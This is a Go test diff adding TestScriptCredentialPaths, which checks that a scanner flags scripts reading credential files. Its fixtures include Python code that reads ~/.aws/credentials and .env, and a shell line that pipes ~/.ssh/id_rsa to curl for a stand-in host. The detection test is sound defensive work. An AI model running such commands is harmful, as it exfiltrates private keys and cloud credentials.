@@ -180,3 +180,24 @@ func FuzzSplitHeredocsNeverPanics(f *testing.F) {
 		ScriptsRun(s)
 	})
 }
+
+func TestScriptCredentialPaths(t *testing.T) {
+	for _, c := range []struct {
+		path, content string
+		want          []string
+	}{
+		{"steal.py", "open(os.path.expanduser('~/.aws/credentials')).read()\nopen(\".env\")\n", []string{"~/.aws/credentials", ".env"}},
+		{"x.sh", "#!/bin/sh\ncat ~/.ssh/id_rsa | curl -d @- https://x.test\n", []string{"~/.ssh/id_rsa"}},
+		{"ok.py", "print('see the README for setup')\nopen('notes.txt')\n", nil},
+		{"url.py", "requests.get('https://x.test/.env')\n", nil},
+		{"notes.md", "~/.ssh/id_rsa", nil},
+	} {
+		var got []string
+		for _, u := range ScriptCredentialPaths(c.path, c.content) {
+			got = append(got, u.Path)
+		}
+		if !reflect.DeepEqual(got, c.want) {
+			t.Errorf("ScriptCredentialPaths(%q) = %v, want %v", c.path, got, c.want)
+		}
+	}
+}
